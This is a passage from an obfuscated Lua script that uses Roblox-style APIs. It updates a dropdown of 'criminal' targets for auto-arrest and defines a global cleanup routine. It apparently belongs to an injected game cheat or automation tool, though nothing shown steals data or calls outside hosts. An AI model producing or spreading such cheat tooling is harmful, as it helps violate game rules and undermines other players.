            end
            local key=table.concat(opts,"|")
            if key~=_0xLastOptStr then
                _0xLastOptStr=key
                _0xCrimAddrByIdx=addrMap
                if _0xTargetDD.SetOptions then _0xTargetDD:SetOptions(opts)end
            else
                _0xCrimAddrByIdx=addrMap
            end
            if _0xArrestTarget then
                local found=false
                for _,addr in pairs(addrMap) do if addr==_0xArrestTarget then found=true break end end
                if not found then _0xArrestTarget=nil end
            end
        end)
        end
    end
end)
while not _0x21 do task.wait(1)end _0x08=false

_G.MyMoms_Cleanup = function()
    _0x08 = false
    _0x21 = true
    _0x36 = false
    _0xAC = false
    if _0xCVCharConn and type(_0xCVCharConn.Disconnect)=="function" then pcall(function()_0xCVCharConn:Disconnect()end)_0xCVCharConn=nil end
    if _0xCVHealthConn and type(_0xCVHealthConn.Disconnect)=="function" then pcall(function()_0xCVHealthConn:Disconnect()end)_0xCVHealthConn=nil end
    if _0xCVBpConn and type(_0xCVBpConn.Disconnect)=="function" then pcall(function()_0xCVBpConn:Disconnect()end)_0xCVBpConn=nil end
    if _0xCVCharWatcher then _0xCVCharWatcher.active=false end
    if _0xCVTeamWatcher then _0xCVTeamWatcher.active=false end
    if _G.ChildVm and type(_G.ChildVm.Destroy)=="function" then pcall(function()_G.ChildVm:Destroy()end) end
    if _0x2A and type(_0x2A.Destroy) == "function" then pcall(function() _0x2A:Destroy() end) end
    if _0x33 then pcall(function() _0x33:Disconnect() end) end
end
